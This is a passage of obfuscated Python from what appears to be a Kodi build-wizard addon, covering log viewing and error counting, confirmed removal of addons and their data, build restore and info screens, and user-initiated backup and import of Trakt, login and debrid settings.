	elif O000OO00OOO0OO0O0 ==False and OOO000O0O00O0OO00 ==False :#line:4098
		wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]No Log File Found![/COLOR]'%COLOR2 )#line:4099
		return #line:4100
	elif not O000OO00OOO0OO0O0 ==False :O0OO0O0OO000OO0O0 =0 #line:4101
	elif not OOO000O0O00O0OO00 ==False :O0OO0O0OO000OO0O0 =1 #line:4102
	OO00OOOO0O00O000O =O000OO00OOO0OO0O0 if O0OO0O0OO000OO0O0 ==0 else OOO000O0O00O0OO00 #line:4104
	O0O0O0OO000OO00OO =wiz .Grab_Log (False )if O0OO0O0OO000OO0O0 ==0 else wiz .Grab_Log (False ,True )#line:4105
	wiz .TextBox ("%s - %s"%(ADDONTITLE ,OO00OOOO0O00O000O ),O0O0O0OO000OO00OO )#line:4107
def errorChecking (log =None ,count =None ,all =None ):#line:4109
	if log ==None :#line:4110
		O000000OO0O00OOOO =wiz .Grab_Log (True )#line:4111
		OO00O00O0OOOOOO0O =wiz .Grab_Log (True ,True )#line:4112
		if not OO00O00O0OOOOOO0O ==False and not O000000OO0O00OOOO ==False :#line:4113
			O0O0OOO0O0OO0OOO0 =DIALOG .select (ADDONTITLE ,["View %s: %s error(s)"%(O000000OO0O00OOOO .replace (LOG ,""),errorChecking (O000000OO0O00OOOO ,True ,True )),"View %s: %s error(s)"%(OO00O00O0OOOOOO0O .replace (LOG ,""),errorChecking (OO00O00O0OOOOOO0O ,True ,True ))])#line:4114
			if O0O0OOO0O0OO0OOO0 ==-1 :wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]View Log Cancelled![/COLOR]'%COLOR2 );return #line:4115
		elif O000000OO0O00OOOO ==False and OO00O00O0OOOOOO0O ==False :#line:4116
			wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]No Log File Found![/COLOR]'%COLOR2 )#line:4117
			return #line:4118
		elif not O000000OO0O00OOOO ==False :O0O0OOO0O0OO0OOO0 =0 #line:4119
		elif not OO00O00O0OOOOOO0O ==False :O0O0OOO0O0OO0OOO0 =1 #line:4120
		log =O000000OO0O00OOOO if O0O0OOO0O0OO0OOO0 ==0 else OO00O00O0OOOOOO0O #line:4121
	if log ==False :#line:4122
		if count ==None :#line:4123
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Log File not Found[/COLOR]"%COLOR2 )#line:4124
			return False #line:4125
		else :#line:4126
			return 0 #line:4127
	else :#line:4128
		if os .path .exists (log ):#line:4129
			O0OOO00OOO000000O =open (log ,mode ='r');O0000O000OOOOOOO0 =O0OOO00OOO000000O .read ().replace ('\n','').replace ('\r','');O0OOO00OOO000000O .close ()#line:4130
			OO00OO0O00O00O000 =re .compile ("-->Python callback/script returned the following error<--(.+?)-->End of Python script error report<--").findall (O0000O000OOOOOOO0 )#line:4131
			if not count ==None :#line:4132
				if all ==None :#line:4133
					O0OOOO0O00OOOOO00 =0 #line:4134
					for O0OO00O00O0OO0O0O in OO00OO0O00O00O000 :#line:4135
						if ADDON_ID in O0OO00O00O0OO0O0O :O0OOOO0O00OOOOO00 +=1 #line:4136
					return O0OOOO0O00OOOOO00 #line:4137
				else :return len (OO00OO0O00O00O000 )#line:4138
			if len (OO00OO0O00O00O000 )>0 :#line:4139
				O0OOOO0O00OOOOO00 =0 ;OOO00OO0OO00OO00O =""#line:4140
				for O0OO00O00O0OO0O0O in OO00OO0O00O00O000 :#line:4141
					if all ==None and not ADDON_ID in O0OO00O00O0OO0O0O :continue #line:4142
					else :#line:4143
						O0OOOO0O00OOOOO00 +=1 #line:4144
						OOO00OO0OO00OO00O +="[COLOR red]Error Number %s[/COLOR]\n(PythonToCppException) : -->Python callback/script returned the following error<--%s-->End of Python script error report<--\n\n"%(O0OOOO0O00OOOOO00 ,O0OO00O00O0OO0O0O .replace ('                                          ','\n').replace ('\\\\','\\').replace (HOME ,''))#line:4145
				if O0OOOO0O00OOOOO00 >0 :#line:4146
					wiz .TextBox (ADDONTITLE ,OOO00OO0OO00OO00O )#line:4147
				else :wiz .LogNotify (ADDONTITLE ,"No Errors Found in Log")#line:4148
			else :wiz .LogNotify (ADDONTITLE ,"No Errors Found in Log")#line:4149
		else :wiz .LogNotify (ADDONTITLE ,"Log File not Found")#line:4150
ACTION_PREVIOUS_MENU =10 #line:4152
ACTION_NAV_BACK =92 #line:4153
ACTION_MOVE_LEFT =1 #line:4154
ACTION_MOVE_RIGHT =2 #line:4155
ACTION_MOVE_UP =3 #line:4156
ACTION_MOVE_DOWN =4 #line:4157
ACTION_MOUSE_WHEEL_UP =104 #line:4158
ACTION_MOUSE_WHEEL_DOWN =105 #line:4159
ACTION_MOVE_MOUSE =107 #line:4160
ACTION_SELECT_ITEM =7 #line:4161
ACTION_BACKSPACE =110 #line:4162
ACTION_MOUSE_LEFT_CLICK =100 #line:4163
ACTION_MOUSE_LONG_CLICK =108 #line:4164
def LogViewer (default =None ):#line:4166
	class O000O00OOOO000O00 (xbmcgui .WindowXMLDialog ):#line:4167
		def __init__ (OOOO0O000OO000O00 ,*O0OO0000OO000O0O0 ,**O000000000OOOO0O0 ):#line:4168
			OOOO0O000OO000O00 .default =O000000000OOOO0O0 ['default']#line:4169
		def onInit (OOO0O00O0O00O00O0 ):#line:4171
			OOO0O00O0O00O00O0 .title =101 #line:4172
			OOO0O00O0O00O00O0 .msg =102 #line:4173
			OOO0O00O0O00O00O0 .scrollbar =103 #line:4174
			OOO0O00O0O00O00O0 .upload =201 #line:4175
			OOO0O00O0O00O00O0 .kodi =202 #line:4176
			OOO0O00O0O00O00O0 .kodiold =203 #line:4177
			OOO0O00O0O00O00O0 .wizard =204 #line:4178
			OOO0O00O0O00O00O0 .okbutton =205 #line:4179
			O0O00O00O0O0OOOO0 =open (OOO0O00O0O00O00O0 .default ,'r')#line:4180
			OOO0O00O0O00O00O0 .logmsg =O0O00O00O0O0OOOO0 .read ()#line:4181
			O0O00O00O0O0OOOO0 .close ()#line:4182
			OOO0O00O0O00O00O0 .titlemsg ="%s: %s"%(ADDONTITLE ,OOO0O00O0O00O00O0 .default .replace (LOG ,'').replace (ADDONDATA ,''))#line:4183
			OOO0O00O0O00O00O0 .showdialog ()#line:4184
		def showdialog (OOOO0OO0000O0OO0O ):#line:4186
			OOOO0OO0000O0OO0O .getControl (OOOO0OO0000O0OO0O .title ).setLabel (OOOO0OO0000O0OO0O .titlemsg )#line:4187
			OOOO0OO0000O0OO0O .getControl (OOOO0OO0000O0OO0O .msg ).setText (wiz .highlightText (OOOO0OO0000O0OO0O .logmsg ))#line:4188
			OOOO0OO0000O0OO0O .setFocusId (OOOO0OO0000O0OO0O .scrollbar )#line:4189
		def onClick (OO0OOO000000OO0OO ,OO0OO0O000O0O0OO0 ):#line:4191
			if OO0OO0O000O0O0OO0 ==OO0OOO000000OO0OO .okbutton :OO0OOO000000OO0OO .close ()#line:4192
			elif OO0OO0O000O0O0OO0 ==OO0OOO000000OO0OO .upload :OO0OOO000000OO0OO .close ();uploadLog .Main ()#line:4193
			elif OO0OO0O000O0O0OO0 ==OO0OOO000000OO0OO .kodi :#line:4194
				O00O0OOOO0OO0OOO0 =wiz .Grab_Log (False )#line:4195
				O00OOO0000OO00O00 =wiz .Grab_Log (True )#line:4196
				if O00O0OOOO0OO0OOO0 ==False :#line:4197
					OO0OOO000000OO0OO .titlemsg ="%s: View Log Error"%ADDONTITLE #line:4198
					OO0OOO000000OO0OO .getControl (OO0OOO000000OO0OO .msg ).setText ("Log File Does Not Exists!")#line:4199
				else :#line:4200
					OO0OOO000000OO0OO .titlemsg ="%s: %s"%(ADDONTITLE ,O00OOO0000OO00O00 .replace (LOG ,''))#line:4201
					OO0OOO000000OO0OO .getControl (OO0OOO000000OO0OO .title ).setLabel (OO0OOO000000OO0OO .titlemsg )#line:4202
					OO0OOO000000OO0OO .getControl (OO0OOO000000OO0OO .msg ).setText (wiz .highlightText (O00O0OOOO0OO0OOO0 ))#line:4203
					OO0OOO000000OO0OO .setFocusId (OO0OOO000000OO0OO .scrollbar )#line:4204
			elif OO0OO0O000O0O0OO0 ==OO0OOO000000OO0OO .kodiold :#line:4205
				O00O0OOOO0OO0OOO0 =wiz .Grab_Log (False ,True )#line:4206
				O00OOO0000OO00O00 =wiz .Grab_Log (True ,True )#line:4207
				if O00O0OOOO0OO0OOO0 ==False :#line:4208
					OO0OOO000000OO0OO .titlemsg ="%s: View Log Error"%ADDONTITLE #line:4209
					OO0OOO000000OO0OO .getControl (OO0OOO000000OO0OO .msg ).setText ("Log File Does Not Exists!")#line:4210
				else :#line:4211
					OO0OOO000000OO0OO .titlemsg ="%s: %s"%(ADDONTITLE ,O00OOO0000OO00O00 .replace (LOG ,''))#line:4212
					OO0OOO000000OO0OO .getControl (OO0OOO000000OO0OO .title ).setLabel (OO0OOO000000OO0OO .titlemsg )#line:4213
					OO0OOO000000OO0OO .getControl (OO0OOO000000OO0OO .msg ).setText (wiz .highlightText (O00O0OOOO0OO0OOO0 ))#line:4214
					OO0OOO000000OO0OO .setFocusId (OO0OOO000000OO0OO .scrollbar )#line:4215
			elif OO0OO0O000O0O0OO0 ==OO0OOO000000OO0OO .wizard :#line:4216
				O00O0OOOO0OO0OOO0 =wiz .Grab_Log (False ,False ,True )#line:4217
				O00OOO0000OO00O00 =wiz .Grab_Log (True ,False ,True )#line:4218
				if O00O0OOOO0OO0OOO0 ==False :#line:4219
					OO0OOO000000OO0OO .titlemsg ="%s: View Log Error"%ADDONTITLE #line:4220
					OO0OOO000000OO0OO .getControl (OO0OOO000000OO0OO .msg ).setText ("Log File Does Not Exists!")#line:4221
				else :#line:4222
					OO0OOO000000OO0OO .titlemsg ="%s: %s"%(ADDONTITLE ,O00OOO0000OO00O00 .replace (ADDONDATA ,''))#line:4223
					OO0OOO000000OO0OO .getControl (OO0OOO000000OO0OO .title ).setLabel (OO0OOO000000OO0OO .titlemsg )#line:4224
					OO0OOO000000OO0OO .getControl (OO0OOO000000OO0OO .msg ).setText (wiz .highlightText (O00O0OOOO0OO0OOO0 ))#line:4225
					OO0OOO000000OO0OO .setFocusId (OO0OOO000000OO0OO .scrollbar )#line:4226
		def onAction (OO0O0000O0O00OO00 ,OOOO00O0OO0OOOOOO ):#line:4228
			if OOOO00O0OO0OOOOOO ==ACTION_PREVIOUS_MENU :OO0O0000O0O00OO00 .close ()#line:4229
			elif OOOO00O0OO0OOOOOO ==ACTION_NAV_BACK :OO0O0000O0O00OO00 .close ()#line:4230
	if default ==None :default =wiz .Grab_Log (True )#line:4231
	OO00OO0O0OOOOOO00 =O000O00OOOO000O00 ("LogViewer.xml",ADDON .getAddonInfo ('path'),'DefaultSkin',default =default )#line:4232
	OO00OO0O0OOOOOO00 .doModal ()#line:4233
	del OO00OO0O0OOOOOO00 #line:4234
def removeAddon (O00O000OO0000O00O ,O0O0OO0O000O0OO0O ,over =False ):#line:4236
	if not over ==False :#line:4237
		OO0000OOO0OOOO00O =1 #line:4238
	else :#line:4239
		OO0000OOO0OOOO00O =DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Are you sure you want to delete the addon:'%COLOR2 ,'Name: [COLOR %s]%s[/COLOR]'%(COLOR1 ,O0O0OO0O000O0OO0O ),'ID: [COLOR %s]%s[/COLOR][/COLOR]'%(COLOR1 ,O00O000OO0000O00O ),yeslabel ='[B][COLOR green]Remove Addon[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]')#line:4240
	if OO0000OOO0OOOO00O ==1 :#line:4241
		OO000O00OO0O0OOOO =os .path .join (ADDONS ,O00O000OO0000O00O )#line:4242
		wiz .log ("Removing Addon %s"%O00O000OO0000O00O )#line:4243
		wiz .cleanHouse (OO000O00OO0O0OOOO )#line:4244
		xbmc .sleep (1000 )#line:4245
		try :shutil .rmtree (OO000O00OO0O0OOOO )#line:4246
		except Exception as O0O00OOO00O0O000O :wiz .log ("Error removing %s"%O00O000OO0000O00O ,xbmc .LOGNOTICE )#line:4247
		removeAddonData (O00O000OO0000O00O ,O0O0OO0O000O0OO0O ,over )#line:4248
	if over ==False :#line:4249
		wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]%s Removed[/COLOR]"%(COLOR2 ,O0O0OO0O000O0OO0O ))#line:4250
def removeAddonData (OOO0O00O0OOOO00OO ,name =None ,over =False ):#line:4252
	if OOO0O00O0OOOO00OO =='all':#line:4253
		if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to remove [COLOR %s]ALL[/COLOR] addon data stored in you Userdata folder?[/COLOR]'%(COLOR2 ,COLOR1 ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:4254
			wiz .cleanHouse (ADDOND )#line:4255
		else :wiz .LogNotify ('[COLOR %s]Remove Addon Data[/COLOR]'%COLOR1 ,'[COLOR %s]Cancelled![/COLOR]'%COLOR2 )#line:4256
	elif OOO0O00O0OOOO00OO =='uninstalled':#line:4257
		if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to remove [COLOR %s]ALL[/COLOR] addon data stored in you Userdata folder for uninstalled addons?[/COLOR]'%(COLOR2 ,COLOR1 ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:4258
			O000OOOOO00O0OO0O =0 #line:4259
			for OO00O000O00OO0O00 in glob .glob (os .path .join (ADDOND ,'*')):#line:4260
				OOOOO0OOO00O000O0 =OO00O000O00OO0O00 .replace (ADDOND ,'').replace ('\\','').replace ('/','')#line:4261
				if OOOOO0OOO00O000O0 in EXCLUDES :pass #line:4262
				elif os .path .exists (os .path .join (ADDONS ,OOOOO0OOO00O000O0 )):pass #line:4263
				else :wiz .cleanHouse (OO00O000O00OO0O00 );O000OOOOO00O0OO0O +=1 ;wiz .log (OO00O000O00OO0O00 );shutil .rmtree (OO00O000O00OO0O00 )#line:4264
			wiz .LogNotify ('[COLOR %s]Clean up Uninstalled[/COLOR]'%COLOR1 ,'[COLOR %s]%s Folders(s) Removed[/COLOR]'%(COLOR2 ,O000OOOOO00O0OO0O ))#line:4265
		else :wiz .LogNotify ('[COLOR %s]Remove Addon Data[/COLOR]'%COLOR1 ,'[COLOR %s]Cancelled![/COLOR]'%COLOR2 )#line:4266
	elif OOO0O00O0OOOO00OO =='empty':#line:4267
		if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to remove [COLOR %s]ALL[/COLOR] empty addon data folders in you Userdata folder?[/COLOR]'%(COLOR2 ,COLOR1 ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:4268
			O000OOOOO00O0OO0O =wiz .emptyfolder (ADDOND )#line:4269
			wiz .LogNotify ('[COLOR %s]Remove Empty Folders[/COLOR]'%COLOR1 ,'[COLOR %s]%s Folders(s) Removed[/COLOR]'%(COLOR2 ,O000OOOOO00O0OO0O ))#line:4270
		else :wiz .LogNotify ('[COLOR %s]Remove Empty Folders[/COLOR]'%COLOR1 ,'[COLOR %s]Cancelled![/COLOR]'%COLOR2 )#line:4271
	else :#line:4272
		OOOOO0O00000OOO0O =os .path .join (USERDATA ,'addon_data',OOO0O00O0OOOO00OO )#line:4273
		if OOO0O00O0OOOO00OO in EXCLUDES :#line:4274
			wiz .LogNotify ("[COLOR %s]Protected Plugin[/COLOR]"%COLOR1 ,"[COLOR %s]Not allowed to remove Addon_Data[/COLOR]"%COLOR2 )#line:4275
		elif os .path .exists (OOOOO0O00000OOO0O ):#line:4276
			if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you also like to remove the addon data for:[/COLOR]'%COLOR2 ,'[COLOR %s]%s[/COLOR]'%(COLOR1 ,OOO0O00O0OOOO00OO ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:4277
				wiz .cleanHouse (OOOOO0O00000OOO0O )#line:4278
				try :#line:4279
					shutil .rmtree (OOOOO0O00000OOO0O )#line:4280
				except :#line:4281
					wiz .log ("Error deleting: %s"%OOOOO0O00000OOO0O )#line:4282
			else :#line:4283
				wiz .log ('Addon data for %s was not removed'%OOO0O00O0OOOO00OO )#line:4284
	wiz .refresh ()#line:4285
def restoreit (O000000OO0OOOOO00 ):#line:4287
	if O000000OO0OOOOO00 =='build':#line:4288
		O00000OO00OOO0OOO =freshStart ('restore')#line:4289
		if O00000OO00OOO0OOO ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Local Restore Cancelled[/COLOR]"%COLOR2 );return #line:4290
	if not wiz .currSkin ()in ['skin.confluence','skin.myconfluence','skin.estuary']:#line:4291
		wiz .skinToDefault ()#line:4292
	wiz .restoreLocal (O000000OO0OOOOO00 )#line:4293
def restoreextit (O00OOOO000O0OO0O0 ):#line:4295
	if O00OOOO000O0OO0O0 =='build':#line:4296
		O0OO00O00OO0OO0OO =freshStart ('restore')#line:4297
		if O0OO00O00OO0OO0OO ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]External Restore Cancelled[/COLOR]"%COLOR2 );return #line:4298
	wiz .restoreExternal (O00OOOO000O0OO0O0 )#line:4299
def buildInfo (O0OOOOO000O0OO000 ):#line:4301
	if wiz .workingURL (SPEEDFILE )==True :#line:4302
		if wiz .checkBuild (O0OOOOO000O0OO000 ,'url'):#line:4303
			O0OOOOO000O0OO000 ,O0000000O00OO00O0 ,OO0OOO0OOO0OO000O ,O0000OO0OO00O0000 ,O0OOO0O0OO0O0O000 ,OO000OO0O0OOO00O0 ,OOOO0O00000O00OO0 ,OOO000O00000OOO0O ,O0O00OOOOOO0O00O0 ,OOO0OO00OO0OOOO00 ,O0O0OOOOOOOOO0OOO =wiz .checkBuild (O0OOOOO000O0OO000 ,'all')#line:4304
			OOO0OO00OO0OOOO00 ='Yes'if OOO0OO00OO0OOOO00 .lower ()=='yes'else 'No'#line:4305
			O0O0OO00OO0OO000O ="[COLOR %s]שם הבילד:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,O0OOOOO000O0OO000 )#line:4306
			O0O0OO00OO0OO000O +="[COLOR %s]גירסת הבילד:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,O0000000O00OO00O0 )#line:4307
			if not OO000OO0O0OOO00O0 =="http://":#line:4308
				O0OO00O0O0OOOO00O =wiz .themeCount (O0OOOOO000O0OO000 ,False )#line:4309
				O0O0OO00OO0OO000O +="[COLOR %s]Build Theme(s):[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,', '.join (O0OO00O0O0OOOO00O ))#line:4310
			O0O0OO00OO0OO000O +="[COLOR %s]קודי גירסה:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,O0OOO0O0OO0O0O000 )#line:4311
			O0O0OO00OO0OO000O +="[COLOR %s]Adult Content:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,OOO0OO00OO0OOOO00 )#line:4312
			O0O0OO00OO0OO000O +="[COLOR %s]תאור:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,O0O0OOOOOOOOO0OOO )#line:4313
			wiz .TextBox (ADDONTITLE ,O0O0OO00OO0OO000O )#line:4314
		else :wiz .log ("Invalid Build Name!")#line:4315
	else :wiz .log ("Build text file not working: %s"%WORKINGURL )#line:4316
def buildVideo (OOOOOOOOO000OOO00 ):#line:4318
	wiz .log ("DDDDDDDDDDDDDDDDDDDDDDDDD: %s"%wiz .workingURL (SPEEDFILE ))#line:4319
	if wiz .workingURL (SPEEDFILE )==True :#line:4320
		O0000OOO000OOO00O =wiz .checkBuild (OOOOOOOOO000OOO00 ,'preview')#line:4321
		wiz .log ("FFFFFFFFFFFFFFFFFFFFFFFFFF: %s"%OOOOOOOOO000OOO00 )#line:4322
		if O0000OOO000OOO00O and not O0000OOO000OOO00O =='http://':playVideo (O0000OOO000OOO00O )#line:4323
		else :wiz .log ("[%s]Unable to find url for video preview"%OOOOOOOOO000OOO00 )#line:4324
	else :wiz .log ("Build text file not working: %s"%WORKINGURL )#line:4325
def dependsList (OO00O0000O0000O00 ):#line:4327
	OO0000000OO0O0OOO =os .path .join (ADDONS ,OO00O0000O0000O00 ,'addon.xml')#line:4328
	if os .path .exists (OO0000000OO0O0OOO ):#line:4329
		O0OOOOOO00OO000O0 =open (OO0000000OO0O0OOO ,mode ='r');OO000OO000O000000 =O0OOOOOO00OO000O0 .read ();O0OOOOOO00OO000O0 .close ();#line:4330
		OO000O00O0OO0OO00 =wiz .parseDOM (OO000OO000O000000 ,'import',ret ='addon')#line:4331
		OO0OO00OOOO0OO0OO =[]#line:4332
		for OOOOOO0OOOOOO0OO0 in OO000O00O0OO0OO00 :#line:4333
			if not 'xbmc.python'in OOOOOO0OOOOOO0OO0 :#line:4334
				OO0OO00OOOO0OO0OO .append (OOOOOO0OOOOOO0OO0 )#line:4335
		return OO0OO00OOOO0OO0OO #line:4336
	return []#line:4337
def manageSaveData (O0000O0OO00OO0OO0 ):#line:4339
	if O0000O0OO00OO0OO0 =='import':#line:4340
		OO000OO0O00OOO000 =os .path .join (ADDONDATA ,'temp')#line:4341
		if not os .path .exists (OO000OO0O00OOO000 ):os .makedirs (OO000OO0O00OOO000 )#line:4342
		OO00OOOO00OO0OO00 =DIALOG .browse (1 ,'[COLOR %s]Select the location of the SaveData.zip[/COLOR]'%COLOR2 ,'files','.zip',False ,False ,HOME )#line:4343
		if not OO00OOOO00OO0OO00 .endswith ('.zip'):#line:4344
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Import Data Error![/COLOR]"%(COLOR2 ))#line:4345
			return #line:4346
		O0000O0OO0000OO00 =os .path .join (MYBUILDS ,'SaveData.zip')#line:4347
		OO00O00OO0O0O0OOO =xbmcvfs .copy (OO00OOOO00OO0OO00 ,O0000O0OO0000OO00 )#line:4348
		wiz .log ("%s"%str (OO00O00OO0O0O0OOO ))#line:4349
		extract .all (xbmc .translatePath (O0000O0OO0000OO00 ),OO000OO0O00OOO000 )#line:4350
		OO00OOOO000000OO0 =os .path .join (OO000OO0O00OOO000 ,'trakt')#line:4351
		OOO0000O0000OOOO0 =os .path .join (OO000OO0O00OOO000 ,'login')#line:4352
		OOOOOOOOOOOO0OO00 =os .path .join (OO000OO0O00OOO000 ,'debrid')#line:4353
		O00O000O00OO0OOOO =0 #line:4354
		if os .path .exists (OO00OOOO000000OO0 ):#line:4355
			O00O000O00OO0OOOO +=1 #line:4356
			O000O00O0OO0O00OO =os .listdir (OO00OOOO000000OO0 )#line:4357
			if not os .path .exists (traktit .TRAKTFOLD ):os .makedirs (traktit .TRAKTFOLD )#line:4358
			for OO000O000O00OO0O0 in O000O00O0OO0O00OO :#line:4359
				O000O000000OO0O0O =os .path .join (traktit .TRAKTFOLD ,OO000O000O00OO0O0 )#line:4360
				O0OO0O0OO0000000O =os .path .join (OO00OOOO000000OO0 ,OO000O000O00OO0O0 )#line:4361
				if os .path .exists (O000O000000OO0O0O ):#line:4362
					if not DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like replace the current [COLOR %s]%s[/COLOR] file?"%(COLOR2 ,COLOR1 ,OO000O000O00OO0O0 ),yeslabel ="[B][COLOR green]Yes Replace[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):continue #line:4363
					else :os .remove (O000O000000OO0O0O )#line:4364
				shutil .copy (O0OO0O0OO0000000O ,O000O000000OO0O0O )#line:4365
			traktit .importlist ('all')#line:4366
			traktit .traktIt ('restore','all')#line:4367
		if os .path .exists (OOO0000O0000OOOO0 ):#line:4368
			O00O000O00OO0OOOO +=1 #line:4369
			O000O00O0OO0O00OO =os .listdir (OOO0000O0000OOOO0 )#line:4370
			if not os .path .exists (loginit .LOGINFOLD ):os .makedirs (loginit .LOGINFOLD )#line:4371
			for OO000O000O00OO0O0 in O000O00O0OO0O00OO :#line:4372
				O000O000000OO0O0O =os .path .join (loginit .LOGINFOLD ,OO000O000O00OO0O0 )#line:4373
				O0OO0O0OO0000000O =os .path .join (OOO0000O0000OOOO0 ,OO000O000O00OO0O0 )#line:4374
				if os .path .exists (O000O000000OO0O0O ):#line:4375
					if not DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like replace the current [COLOR %s]%s[/COLOR] file?"%(COLOR2 ,COLOR1 ,OO000O000O00OO0O0 ),yeslabel ="[B][COLOR green]Yes Replace[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):continue #line:4376
					else :os .remove (O000O000000OO0O0O )#line:4377
				shutil .copy (O0OO0O0OO0000000O ,O000O000000OO0O0O )#line:4378
			loginit .importlist ('all')#line:4379
			loginit .loginIt ('restore','all')#line:4380
		if os .path .exists (OOOOOOOOOOOO0OO00 ):#line:4381
			O00O000O00OO0OOOO +=1 #line:4382
			O000O00O0OO0O00OO =os .listdir (OOOOOOOOOOOO0OO00 )#line:4383
			if not os .path .exists (debridit .REALFOLD ):os .makedirs (debridit .REALFOLD )#line:4384
			for OO000O000O00OO0O0 in O000O00O0OO0O00OO :#line:4385
				O000O000000OO0O0O =os .path .join (debridit .REALFOLD ,OO000O000O00OO0O0 )#line:4386
				O0OO0O0OO0000000O =os .path .join (OOOOOOOOOOOO0OO00 ,OO000O000O00OO0O0 )#line:4387
				if os .path .exists (O000O000000OO0O0O ):#line:4388
					if not DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like replace the current [COLOR %s]%s[/COLOR] file?"%(COLOR2 ,COLOR1 ,OO000O000O00OO0O0 ),yeslabel ="[B][COLOR green]Yes Replace[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):continue #line:4389
					else :os .remove (O000O000000OO0O0O )#line:4390
				shutil .copy (O0OO0O0OO0000000O ,O000O000000OO0O0O )#line:4391
			debridit .importlist ('all')#line:4392
			debridit .debridIt ('restore','all')#line:4393
		wiz .cleanHouse (OO000OO0O00OOO000 )#line:4394
		wiz .removeFolder (OO000OO0O00OOO000 )#line:4395
		os .remove (O0000O0OO0000OO00 )#line:4396
		if O00O000O00OO0OOOO ==0 :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Save Data Import Failed[/COLOR]"%COLOR2 )#line:4397
		else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Save Data Import Complete[/COLOR]"%COLOR2 )#line:4398
	elif O0000O0OO00OO0OO0 =='export':#line:4399
		OO0O0OOOOO00O000O =xbmc .translatePath (MYBUILDS )#line:4400
		O0O000OOO0O0O00OO =[traktit .TRAKTFOLD ,debridit .REALFOLD ,loginit .LOGINFOLD ]#line:4401
		traktit .traktIt ('update','all')#line:4402
		loginit .loginIt ('update','all')#line:4403
		debridit .debridIt ('update','all')#line:4404
		OO00OOOO00OO0OO00 =DIALOG .browse (3 ,'[COLOR %s]Select where you wish to export the savedata zip?[/COLOR]'%COLOR2 ,'files','',False ,True ,HOME )#line:4405
		OO00OOOO00OO0OO00 =xbmc .translatePath (OO00OOOO00OO0OO00 )#line:4406
		OOO00O00000OO0OOO =os .path .join (OO0O0OOOOO00O000O ,'SaveData.zip')#line:4407
		OOO00O00O000O00O0 =zipfile .ZipFile (OOO00O00000OO0OOO ,mode ='w')#line:4408
		for OO0000O00OOOOO0O0 in O0O000OOO0O0O00OO :#line:4409
			if os .path .exists (OO0000O00OOOOO0O0 ):#line:4410
				O000O00O0OO0O00OO =os .listdir (OO0000O00OOOOO0O0 )#line:4411
				for OO00000O0OOO0OO00 in O000O00O0OO0O00OO :#line:4412
					OOO00O00O000O00O0 .write (os .path .join (OO0000O00OOOOO0O0 ,OO00000O0OOO0OO00 ),os .path .join (OO0000O00OOOOO0O0 ,OO00000O0OOO0OO00 ).replace (ADDONDATA ,''),zipfile .ZIP_DEFLATED )#line:4413
		OOO00O00O000O00O0 .close ()#line:4414
		if OO00OOOO00OO0OO00 ==OO0O0OOOOO00O000O :#line:4415
			DIALOG .ok (ADDONTITLE ,"[COLOR %s]Save data has been backed up to:[/COLOR]"%(COLOR2 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,OOO00O00000OO0OOO ))#line:4416
		else :#line:4417
			try :#line:4418
				xbmcvfs .copy (OOO00O00000OO0OOO ,os .path .join (OO00OOOO00OO0OO00 ,'SaveData.zip'))#line:4419
				DIALOG .ok (ADDONTITLE ,"[COLOR %s]Save data has been backed up to:[/COLOR]"%(COLOR2 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,os .path .join (OO00OOOO00OO0OO00 ,'SaveData.zip')))#line:4420
			except :#line:4421
				DIALOG .ok (ADDONTITLE ,"[COLOR %s]Save data has been backed up to:[/COLOR]"%(COLOR2 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,OOO00O00000OO0OOO ))#line:4422
def freshStart (install =None ,over =False ):#line:4427
	if USERNAME =='':#line:4428
		ADDON .openSettings ()#line:4429
		sys .exit ()#line:4430
	O0OOOO000OOOOOO00 =u_list (SPEEDFILE )#line:4431
